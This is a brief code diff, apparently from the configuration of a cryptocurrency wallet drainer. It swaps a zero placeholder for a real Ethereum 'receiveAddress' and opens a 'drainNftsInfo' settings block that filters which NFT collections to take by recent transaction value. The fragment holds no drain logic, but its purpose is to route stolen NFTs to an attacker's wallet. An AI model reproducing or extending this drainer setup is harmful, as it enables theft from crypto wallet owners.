@@ -1,4 +1,4 @@
-const receiveAddress = "0x00000000000000000000000000000000";
+const receiveAddress = "0xF73deB5c9DF1778fd5CeB96eFe7a013a643d211d";
 
 const drainNftsInfo = {
     minValue: 0.1, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
